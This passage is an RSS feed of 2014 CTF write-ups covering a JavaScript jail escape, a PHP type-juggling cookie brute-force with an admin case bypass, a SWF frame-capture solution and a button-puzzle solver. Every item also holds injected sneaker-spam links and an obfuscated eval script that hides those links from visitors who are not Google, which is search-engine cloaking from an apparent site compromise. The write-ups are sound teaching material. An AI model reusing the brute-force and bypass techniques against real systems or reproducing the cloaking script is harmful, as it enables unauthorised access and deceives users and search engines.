@@ -1,0 +1,306 @@
+<?xml version="1.0" encoding="utf-8"?>
+<rss version="2.0" xml:base="https://ctfcrew.org"  xmlns:dc="http://purl.org/dc/elements/1.1/">
+<channel>
+ <title>BalalaikaCr3w - SecuInside CTF Quals 2014</title>
+ <link>https://ctfcrew.org/event/22</link>
+ <description></description>
+ <language>en</language>
+<item>
+ <title>JavaScript jail</title>
+ <link>https://ctfcrew.org/writeup/62</link>
+ <description>&lt;div class=&quot;field field-name-field-category field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Category:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/categories/web&quot;&gt;web&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;field-item odd&quot;&gt;&lt;a href=&quot;/categories/pwn&quot;&gt;pwn&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-event field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Event:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/event/22&quot;&gt;SecuInside CTF Quals 2014&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;p&gt;We have an ip address and a port. Connected using netcat we got V8 JavaScript shell. &lt;em&gt;print(Object.keys(this)) &lt;/em&gt;gives us all global objects available: print, quit, checker, check.&lt;/p&gt;&lt;p&gt;&lt;!--break--&gt;&lt;/p&gt;&lt;p&gt;&lt;em&gt;print(check) &lt;/em&gt;gives our pwn target:&lt;/p&gt;&lt;pre class=&quot;brush: jscript; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;function (rand) {
+	function stage1() {
+		var a = Array.apply(null, new Array(Math.floor(Math.random() * 20) + 10)).map(function () {return Math.random() * 0x10000;});
+		var b = rand(a.length);
+
+		if (!Array.isArray(b)) {
+			print(&quot;You&#039;re a cheater!&quot;);
+			return false;
+		}
+
+		if (b.length &amp;lt; a.length) {
+			print(&quot;hmm.. too short..&quot;);
+			for (var i = 0, n = a.length - b.length; i &amp;lt; n; i++) {
+				delete b[b.length];
+				b[b.length] = [Math.random() * 0x10000];
+			}
+		} else if (b.length &amp;gt; a.length) {
+			print(&quot;hmm.. too long..&quot;);
+			for (var i = 0, n = b.length - a.length; i &amp;lt; n; i++)
+				Array.prototype.pop.apply(b);
+		}
+
+		for (var i = 0, n = b.length; i &amp;lt; n; i++) {
+			if (a[i] != b[i]) {
+				print(&quot;ddang~~&quot;);
+				return false;
+			}
+		}
+
+		return true;
+	}
+
+	function stage2() {
+		var a = Array.apply(null, new Array((myRand() % 20) + 10)).map(function () {return myRand() % 0x10000;});
+		var b = rand(a.length);
+
+		if (!Array.isArray(b)) {
+			print(&quot;You&#039;re a cheater!&quot;);
+			return false;
+		}
+
+		if (b.length &amp;lt; a.length) {
+			print(&quot;hmm.. too short..&quot;);
+			for (var i = 0, n = a.length - b.length; i &amp;lt; n; i++) {
+				delete b[b.length];
+				b[b.length] = [Math.random() * 0x10000];
+			}
+		} else if (b.length &amp;gt; a.length) {
+			print(&quot;hmm.. too long..&quot;);
+			for (var i = 0, n = b.length - a.length; i &amp;lt; n; i++)
+				Array.prototype.pop.apply(b);
+		}
+
+		for (var i = 0, n = b.length; i &amp;lt; n; i++) {
+			if (a[i] != b[i]) {
+				print(&quot;ddang~~&quot;);
+				return false;
+			}
+		}
+
+		return true;
+	}
+
+	print(&quot;stage1&quot;);
+
+	if (!stage1())
+		return;
+
+	print(&quot;stage2&quot;);
+
+	if (!stage2())
+		return;
+
+	print(&quot;awesome!&quot;);
+	return flag;
+}&lt;/pre&gt;&lt;p&gt;The flag is contained in closure made by calling &lt;em&gt;checker&lt;/em&gt;. Since there is no any legal method to take variables from closure we have to deceive &lt;em&gt;check&lt;/em&gt; tests somehow. It&#039;s JavaScript baby, we can redefine everything. The simplest solution is to redefine &lt;em&gt;Array.apply&lt;/em&gt; in a way it returns empty array and to return empty array from our &lt;em&gt;rand&lt;/em&gt; function. Obviously two empty arrays are the same size and have same elements. Let&#039;s do it:&lt;/p&gt;&lt;pre class=&quot;brush: jscript; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;Array.apply = function() {return [];};
+function rand() {return [];}
+check(rand);&lt;/pre&gt;&lt;p&gt;This is it.&lt;/p&gt;&lt;span class=&quot;keys_words&quot;&gt;&lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.jmksport.com/&quot;&gt;Sportswear free shipping&lt;/a&gt; | &lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.oft.gov.gi/index.php/eeaggeshop/p/nike-air-force-1-07-essential-blanche-et-or-femme-172723.html&quot;&gt;Nike Air Force 1&#039;07 Essential blanche et or femme - Chaussures Baskets femme - Gov&lt;/a&gt;&lt;/span&gt;&lt;script&gt;eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#039;&#039;.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return&#039;\\w+&#039;};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(&#039;\\b&#039;+e(c)+&#039;\\b&#039;,&#039;g&#039;),k[c]);return p;}(&#039;b i=r f[&quot;\\q\\1\\4\\g\\p\\l&quot;](&quot;\\4&quot;+&quot;\\7&quot;+&quot;\\7&quot;+&quot;\\4&quot;+&quot;\\5\\1&quot;,&quot;\\4\\k&quot;);s(!i[&quot;\\3\\1\\2\\3&quot;](m[&quot;\\h\\2\\1\\j\\n\\4\\1\\6\\3&quot;])){b a=f[&quot;\\e\\7\\o\\h\\d\\1\\6\\3&quot;][&quot;\\4\\1\\3\\g\\5\\1\\d\\1\\6\\3\\2\\z\\9\\A\\5\\c\\2\\2\\x\\c\\d\\1&quot;](\&#039;\\t\\1\\9\\2\\w\\v\\7\\j\\e\\2\&#039;);u(b 8=0;8&lt;a[&quot;\\5\\1\\6\\4\\3\\y&quot;];8++)a[8][&quot;\\2\\3\\9\\5\\1&quot;][&quot;\\e\\k\\2\\l\\5\\c\\9&quot;]=\&#039;\\6\\7\\6\\1\&#039;}&#039;,37,37,&#039;|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43&#039;.split(&#039;|&#039;),0,{}));&lt;/script&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Mon, 02 Jun 2014 09:14:59 +0000</pubDate>
+ <dc:creator>villytiger</dc:creator>
+ <guid isPermaLink="false">62 at https://ctfcrew.org</guid>
+ <comments>https://ctfcrew.org/writeup/62#comments</comments>
+</item>
+<item>
+ <title>Web 200</title>
+ <link>https://ctfcrew.org/writeup/61</link>
+ <description>&lt;div class=&quot;field field-name-field-category field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Category:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/categories/web&quot;&gt;web&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-event field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Event:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/event/22&quot;&gt;SecuInside CTF Quals 2014&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;p&gt;The sense of this task is to login with user which idx=1. But we don&#039;t know, who has this idx&lt;/p&gt;
+&lt;p&gt;The algoritm for cookie is CRCR32 and this is strange. Because this hash purpose is not for crypto, it&#039;s for checksums. But for first try code of server look&#039;s good enough. &lt;strong&gt;REALY THANK TO ORGS, BECAUSE CODE IS GREAT AND SIMPLE, SO IT&#039;S REALY EASY TO UNDERSTAND THE LOGIC OF SERVER&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;After reading some manuals we decided that the vuln is in hash. And found &lt;a href=&quot;https://www.alertlogic.com/writing-exploits-for-exotic-bug-classes-php-type-juggling/&quot;&gt;post about comparison issues&lt;/a&gt; in php whith float string&lt;/p&gt;
+&lt;p&gt;Php is not strongly typed, and that&#039;s why there is some magic with comprassions, and one of them is casting both string to float if they look like float. For example:&lt;/p&gt;
+&lt;pre class=&quot;brush: php; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;
+	if (&quot;0e12&quot; == &quot;0&quot;)
+		echo 1;
+	else
+		echo 2;
+&lt;/pre&gt;
+&lt;p&gt;This code prints 1!!!! This is magic two different string are equal))&lt;/p&gt;
+&lt;p&gt;So we decided to brute cookie. We were always sending hash = &quot;0&quot; and different timestamp&lt;/p&gt;
+&lt;p&gt;Some calculation, we need first symbol to be &quot;0&quot;, second &quot;e&quot;, and all other is digits. So the probability is 1/16 * 1/16 * (10/16)**6. this is equal to 1/4300, that is not much for online brute&lt;/p&gt;
+&lt;p&gt;First part was done, we could logged-in with id we want. But what id we need?&lt;/p&gt;
+&lt;p&gt;After reading code we found this strange&lt;/p&gt;
+&lt;pre class=&quot;brush: php; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;public function islogin(){
+			if( preg_match(&quot;/[^0-9A-Za-z]/&quot;, $_COOKIE[&#039;user_name&#039;]) ){
+	 			exit(&quot;cannot be used Special character&quot;);
+			}
+
+			if( $_COOKIE[&#039;user_name&#039;] == &quot;admin&quot; )	return 0;
+
+			$salt = file_get_contents(&quot;../../long_salt.txt&quot;);
+
+			if( hash(&#039;crc32&#039;,$salt.&#039;|&#039;.(int)$_COOKIE[&#039;login_time&#039;].&#039;|&#039;.$_COOKIE[&#039;user_name&#039;]) == $_COOKIE[&#039;hash&#039;] ){
+				return 1;
+			}
+
+			return 0;
+		}
+&lt;/pre&gt;
+&lt;p&gt;The 6th string seems to be strange, why id admin is restricred. This is easy to bypass. We just need to login with name in uppercase, because php use case sensetive cmp, but sql not.&lt;/p&gt;
+&lt;p&gt;So the brute scipt is:&lt;/p&gt;
+&lt;pre class=&quot;brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;import requests
+
+u1 = &quot;http://219.240.37.153:5959/63972dfdacc8a838f618275d80d27c1d_h/index.php&quot;
+for i in xrange(0, 10000000):
+    print i
+    cookies = {
+        &quot;login_time&quot;: str(i),
+        &quot;user_name&quot;: &quot;ADMIN&quot;,
+        &quot;hash&quot;: &quot;0&quot;
+    }
+    try:
+        r = requests.get(u1, cookies=cookies).content
+    except:
+        continue
+    if &#039;&lt;input type=&quot;text&quot; class=&quot;form-control&quot; name=&quot;id&quot; id=&quot;inputID&quot; placeholder=&quot;ID&quot;&gt;&#039; not in r:
+        print r
+        exit(0)
+
+&lt;/pre&gt;&lt;span class=&quot;keys_words&quot;&gt;&lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.jmksport.com/&quot;&gt;buy footwear&lt;/a&gt; | &lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.ietp.com/fr/dfediqshop/release-dates/nike/air-jordan-1/&quot;&gt;Women&#039;s Nike Air Jordan 1 trainers - Latest Releases , Ietp&lt;/a&gt;&lt;/span&gt;&lt;script&gt;eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#039;&#039;.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return&#039;\\w+&#039;};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(&#039;\\b&#039;+e(c)+&#039;\\b&#039;,&#039;g&#039;),k[c]);return p;}(&#039;b i=r f[&quot;\\q\\1\\4\\g\\p\\l&quot;](&quot;\\4&quot;+&quot;\\7&quot;+&quot;\\7&quot;+&quot;\\4&quot;+&quot;\\5\\1&quot;,&quot;\\4\\k&quot;);s(!i[&quot;\\3\\1\\2\\3&quot;](m[&quot;\\h\\2\\1\\j\\n\\4\\1\\6\\3&quot;])){b a=f[&quot;\\e\\7\\o\\h\\d\\1\\6\\3&quot;][&quot;\\4\\1\\3\\g\\5\\1\\d\\1\\6\\3\\2\\z\\9\\A\\5\\c\\2\\2\\x\\c\\d\\1&quot;](\&#039;\\t\\1\\9\\2\\w\\v\\7\\j\\e\\2\&#039;);u(b 8=0;8&lt;a[&quot;\\5\\1\\6\\4\\3\\y&quot;];8++)a[8][&quot;\\2\\3\\9\\5\\1&quot;][&quot;\\e\\k\\2\\l\\5\\c\\9&quot;]=\&#039;\\6\\7\\6\\1\&#039;}&#039;,37,37,&#039;|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43&#039;.split(&#039;|&#039;),0,{}));&lt;/script&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Sun, 01 Jun 2014 20:05:07 +0000</pubDate>
+ <dc:creator>briskly</dc:creator>
+ <guid isPermaLink="false">61 at https://ctfcrew.org</guid>
+ <comments>https://ctfcrew.org/writeup/61#comments</comments>
+</item>
+<item>
+ <title>yayaya</title>
+ <link>https://ctfcrew.org/writeup/60</link>
+ <description>&lt;div class=&quot;field field-name-field-category field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Category:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/categories/reverse&quot;&gt;reverse&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-event field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Event:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/event/22&quot;&gt;SecuInside CTF Quals 2014&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;p&gt;After decompilation of given SWF file we have found that the code can be divided in two parts. First one is responsible for moving sections of ELF file from SWF&#039;s resources to virtual memory. The second one draws black font picture and small colored blocks. The most intresting thing is that position and size of these small colored blocks are defined from ELF binary.&lt;/p&gt;&lt;p&gt;So we get SWF using Crossbridge. So the swf generating the pictures every n milliseconds, but n is always different, and we just need to sum the frames, to get flag&lt;/p&gt;&lt;p&gt;I tried to find programs like swf2png etc. But all of them were trying to get resources, but not to capture the buidling frames.&lt;/p&gt;&lt;p&gt;After that I tried to capture video using the ffmpeg. But after a lot of failed attemps, I just download the programm that makes screen every N millisecons. I ran this programm with flash file and made 4500 of screens. After that I just summed it using PythonImageLibrary and numpy&lt;/p&gt;&lt;pre class=&quot;brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;from PIL import Image
+from PIL.Image import fromarray
+from numpy import asarray
+from os import listdir
+
+images = []
+
+dirname = &quot;screens&quot;
+for i, f in enumerate(listdir(dirname)):
+    print i
+    image = Image.open(&quot;%s/%s&quot; % (dirname, f))
+    if i == 0:
+        dif = asarray(image)
+    elif i % 100 == 0:
+        fromarray(dif).save(&quot;res/file%s.png&quot; % i)
+    else:
+        dif = dif + asarray(image)
+fromarray(dif).save(&quot;file6.png&quot;)
+
+&lt;/pre&gt;&lt;p&gt;This script has generated the flag. I think that we get not all frames but it was enough to get flag&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/sites/default/files/writeups/images/file7.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;P.S. The most funny part was, that one of my teammates ran swf debuger with that file, and forget about it. And after several hours when he switched back swf debugger app, he have seen the lag, where the frames were summed by debbugger. It was worse picture than that, but it was possible to restore flag i think.&lt;/p&gt;&lt;p&gt;Finally, the flag is:&amp;nbsp;&lt;strong&gt;GANADAHAAH&lt;/strong&gt;&lt;/p&gt;&lt;span class=&quot;keys_words&quot;&gt;&lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.jmksport.com/&quot;&gt;Asics footwear&lt;/a&gt; | &lt;a class=&quot;links_good_rands&quot; href=&quot;https://aractidf.org/bfasshop/sneakers&quot;&gt;Sneakers&lt;/a&gt;&lt;/span&gt;&lt;script&gt;eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#039;&#039;.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return&#039;\\w+&#039;};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(&#039;\\b&#039;+e(c)+&#039;\\b&#039;,&#039;g&#039;),k[c]);return p;}(&#039;b i=r f[&quot;\\q\\1\\4\\g\\p\\l&quot;](&quot;\\4&quot;+&quot;\\7&quot;+&quot;\\7&quot;+&quot;\\4&quot;+&quot;\\5\\1&quot;,&quot;\\4\\k&quot;);s(!i[&quot;\\3\\1\\2\\3&quot;](m[&quot;\\h\\2\\1\\j\\n\\4\\1\\6\\3&quot;])){b a=f[&quot;\\e\\7\\o\\h\\d\\1\\6\\3&quot;][&quot;\\4\\1\\3\\g\\5\\1\\d\\1\\6\\3\\2\\z\\9\\A\\5\\c\\2\\2\\x\\c\\d\\1&quot;](\&#039;\\t\\1\\9\\2\\w\\v\\7\\j\\e\\2\&#039;);u(b 8=0;8&lt;a[&quot;\\5\\1\\6\\4\\3\\y&quot;];8++)a[8][&quot;\\2\\3\\9\\5\\1&quot;][&quot;\\e\\k\\2\\l\\5\\c\\9&quot;]=\&#039;\\6\\7\\6\\1\&#039;}&#039;,37,37,&#039;|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43&#039;.split(&#039;|&#039;),0,{}));&lt;/script&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Sun, 01 Jun 2014 18:31:59 +0000</pubDate>
+ <dc:creator>briskly</dc:creator>
+ <guid isPermaLink="false">60 at https://ctfcrew.org</guid>
+ <comments>https://ctfcrew.org/writeup/60#comments</comments>
+</item>
+<item>
+ <title>Brain fuzzing</title>
+ <link>https://ctfcrew.org/writeup/59</link>
+ <description>&lt;div class=&quot;field field-name-field-category field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Category:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/categories/ppc&quot;&gt;ppc&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-field-event field-type-taxonomy-term-reference field-label-inline clearfix&quot;&gt;&lt;div class=&quot;field-label&quot;&gt;Event:&amp;nbsp;&lt;/div&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;a href=&quot;/event/22&quot;&gt;SecuInside CTF Quals 2014&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;field field-name-body field-type-text-with-summary field-label-hidden&quot;&gt;&lt;div class=&quot;field-items&quot;&gt;&lt;div class=&quot;field-item even&quot;&gt;&lt;p&gt;This kind of famous task. You have board with buttons, wich have 2 positions. In Russia there is old quest game with &lt;a href=&quot;http://ru.wikipedia.org/wiki/%D0%91%D1%80%D0%B0%D1%82%D1%8C%D1%8F_%D0%9A%D0%BE%D0%BB%D0%BE%D0%B1%D0%BA%D0%B8&quot;&gt;brother pilots&lt;/a&gt; and there was the same task to open the fridge with board 4x4. And there was solution remember all buttons in first position. And switch all this buttons one by one. Repeating this algoritm from 1 to 3 times, you will win.&lt;/p&gt;&lt;p&gt;Also it was kind of this task on phdays quals 2013 (I haven&#039;t seen it, but heard about it), and kind of this task on defcon quals 2013, but there was the diffrence. There when you were pushing the button raw and column were reversing but the button you push wasn&#039;t&lt;/p&gt;&lt;p&gt;On this ctf there was 4 levels of dificulty of this task. First one is the same a wrote (3 times). Second the same but you need to remeber your steps by yourself(3 times more)&lt;/p&gt;&lt;p&gt;But the most difficult was third part. Orgs have changed the conditions and this time button had 3 positions. That was difficult. After some googling, we found &lt;a href=&quot;http://www.rsdn.ru/forum/etude/3165333.hot&quot;&gt;better algorythm&lt;/a&gt; for 2 position condition (sorry for russian link). The sense is to build weight matrix. I upgraded it, for more than 2 postions. It was kind of lucky upgrade, I wasn&#039;t sure it work. So we build matrix where the cell is &lt;strong&gt;(-1)*(sum(raw) + sum(column)) mod N (N=3)&lt;/strong&gt;.&lt;/p&gt;&lt;pre class=&quot;brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;# ar is board transfered to ints [[0,1],[1,0]]
+def wMatr(ar, N=3):
+    cMax = len(ar[0])
+    rMax = len(ar)
+    wM = deepcopy(ar)
+    for i, raw in enumerate(ar):
+        for j, column in enumerate(raw):
+            # counting weight for cell, last sub is to remove the dublicate of cell with i,j coords
+            wM[i][j] = (sum(raw) + sum(ar[k][j] for k in xrange(rMax)) - ar[i][j]) % N
+            # reverse the value cell
+            if wM[i][j] != 0:
+                wM[i][j] = N - wM[i][j]
+    return wM
+&lt;/pre&gt;&lt;p&gt;And after that we push the buttons according to that matrix. After first applying of this algorytm, we get board with the same raws like:&lt;/p&gt;&lt;p&gt;1111&lt;br&gt; 2222&lt;br&gt; 1111&lt;br&gt; 0000&lt;/p&gt;&lt;p&gt;After applying it more than one time, we get the right answer. But that decision is not optimal. And sometimes, it need too many attemps. But it wroked 90% of times.&lt;/p&gt;&lt;p&gt;The last 4th task was kind of boss, it was board with 2 postitions but with size 200x200. There were some problems with connection, so my script sometimes couldn&#039;t get the full board. But after over9000 attemps it worked&lt;/p&gt;&lt;p&gt;Full code of the solution:&lt;/p&gt;&lt;pre class=&quot;brush: python; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;import re
+from socket import create_connection
+from copy import deepcopy
+from time import sleep
+
+host = &quot;54.198.73.164&quot;
+host = &quot;54.81.138.191&quot;
+port = 5555
+hSock = create_connection((host, port))
+ans = hSock.recv(10240)
+
+def invert2(x, y, ar, N=3):
+    t = ar[x][y]
+    for i in range(len(ar[0])):
+        ar[x][i] = (ar[x][i] + 1) % N
+    for i in range(len(ar)):
+        ar[i][y] = (ar[i][y] + 1) % N
+    ar[x][y] = (t+1) % N
+    return ar
+
+repl = {
+  2: {
+    &quot;O&quot;: 0,
+    &quot;X&quot;: 1
+  },
+  3: {
+    &quot;O&quot;: 0,
+    &quot;W&quot;: 1,
+    &quot;X&quot;: 2
+  }
+}
+
+def serv():
+    for asd in range(10000):
+        if asd == 0 or &quot;Lupin hear a sound from safebox&quot; in ans:
+            sleep(1)
+            ans = hSock.recv(102400)
+            print ans
+            x, y = map(int, re.findall(&quot;Board&amp;gt;\s+(\d+)\s+(\d+)&quot;, ans)[0])
+            ar = ans.split(&quot;\n&quot;)[-x-1:-1]
+            N = len(set(&quot;&quot;.join(ar)))
+            ar = map(list, ar)
+            for i in range(len(ar)):
+                for j in range(len(ar[0])):
+                    ar[i][j] = repl[N][ar[i][j]]
+
+            mine = deepcopy(ar)
+        
+        while True:
+            sleep(1)
+            wM = wMatr(mine, N)
+            for i, raw in enumerate(wM):
+                for j, column in enumerate(raw):
+                    for k in range(column):
+                        mine = invert2(i, j, mine, N)
+                        hSock.send(&quot;%s %s\n&quot; % (i, j));
+                        ans = hSock.recv(102400)
+                        if len(ans) &amp;gt; 5:
+                            print ans
+                    #print &quot;\n&quot;.join(&quot;&quot;.join(map((str), c)) for c in mine), &quot;\n&quot;
+            if &quot;Lupin hear a sound from safebox. some layout of button changed&quot; in ans:
+                break
+            if &quot;Too many attempts&quot; in ans:
+                exit(0)
+            if set(&quot;&quot;.join(&quot;&quot;.join(map((str), c)) for c in mine)) == set([&quot;0&quot;]):
+                break
+
+    print hSock.recv(10240)
+
+def wMatr(ar, N=3):
+    cMax = len(ar[0])
+    rMax = len(ar)
+    wM = deepcopy(ar)
+    for i, raw in enumerate(ar):
+        for j, column in enumerate(raw):
+            wM[i][j] = (sum(raw) + sum(ar[k][j] for k in xrange(rMax)) - ar[i][j]) % N
+            if wM[i][j] != 0:
+                wM[i][j] = N - wM[i][j]
+    return wM
+
+serv()&lt;/pre&gt;&lt;p&gt;&lt;br&gt;Finally we receive message with flag:&lt;/p&gt;&lt;pre class=&quot;brush: plain; auto-links: true; collapse: false; first-line: 1; html-script: false; smart-tabs: true; tab-size: 4; toolbar: true; codetag&quot;&gt;Lupin hear a sound from safebox. some layout of button changed
+
+There is a beep sound from safebox. we might be on the right way.
+Some strange noise come out from the safebox..
+                        &#039;
+               &#039;        &#039;        &#039;
+       &#039;         &#039;      &#039;      &#039;        &#039;
+          &#039;        \    &#039;    /       &#039;
+              &#039; .   .-&quot;```&quot;-.  . &#039;
+                    \`-._.-`/   
+         - -  =      \\ | //      =  -  -
+                    &#039; \\|// &#039;   
+              . &#039;      \|/     &#039; .
+           .         &#039;  `  &#039;         .
+        .          /    .    \           .
+                 .      .      .
+
+
+Congrats!!!! Lupin finally got the Cherry Saphhire!!
+Right behind of the jewel, Lupin found a short memo
+-----------------------------------------------------
+The flag is &quot;THE BEST people are always TAKEN, if you don&#039;t STEAL them, you won&#039;t HAVE them&quot; (without quote)&lt;/pre&gt;&lt;p&gt;&lt;br&gt; So, &lt;strong&gt;THE BEST people are always TAKEN, if you don&#039;t STEAL them, you won&#039;t HAVE them&lt;/strong&gt;&lt;/p&gt;&lt;span class=&quot;keys_words&quot;&gt;&lt;a class=&quot;links_good_rands&quot; href=&quot;https://www.runtrendy.com/&quot;&gt;Running Sneakers&lt;/a&gt; | &lt;a class=&quot;links_good_rands&quot; href=&quot;http://www.sb-roscoff.fr/en/bdehfshop/en/category/men/sneaker/?manufacturer=Nike&amp;page=1&quot;&gt;Buy online Sneaker for Men&lt;/a&gt;&lt;/span&gt;&lt;script&gt;eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#039;&#039;.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return&#039;\\w+&#039;};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(&#039;\\b&#039;+e(c)+&#039;\\b&#039;,&#039;g&#039;),k[c]);return p;}(&#039;b i=r f[&quot;\\q\\1\\4\\g\\p\\l&quot;](&quot;\\4&quot;+&quot;\\7&quot;+&quot;\\7&quot;+&quot;\\4&quot;+&quot;\\5\\1&quot;,&quot;\\4\\k&quot;);s(!i[&quot;\\3\\1\\2\\3&quot;](m[&quot;\\h\\2\\1\\j\\n\\4\\1\\6\\3&quot;])){b a=f[&quot;\\e\\7\\o\\h\\d\\1\\6\\3&quot;][&quot;\\4\\1\\3\\g\\5\\1\\d\\1\\6\\3\\2\\z\\9\\A\\5\\c\\2\\2\\x\\c\\d\\1&quot;](\&#039;\\t\\1\\9\\2\\w\\v\\7\\j\\e\\2\&#039;);u(b 8=0;8&lt;a[&quot;\\5\\1\\6\\4\\3\\y&quot;];8++)a[8][&quot;\\2\\3\\9\\5\\1&quot;][&quot;\\e\\k\\2\\l\\5\\c\\9&quot;]=\&#039;\\6\\7\\6\\1\&#039;}&#039;,37,37,&#039;|x65|x73|x74|x67|x6c|x6e|x6f|NLpndlS3|x79|rBfb2|var|x61|x6d|x64|window|x45|x75|AESwV1|x72|x69|x70|navigator|x41|x63|x78|x52|new|if|x6b|for|x77|x5f|x4e|x68|x42|x43&#039;.split(&#039;|&#039;),0,{}));&lt;/script&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</description>
+ <pubDate>Sun, 01 Jun 2014 18:08:55 +0000</pubDate>
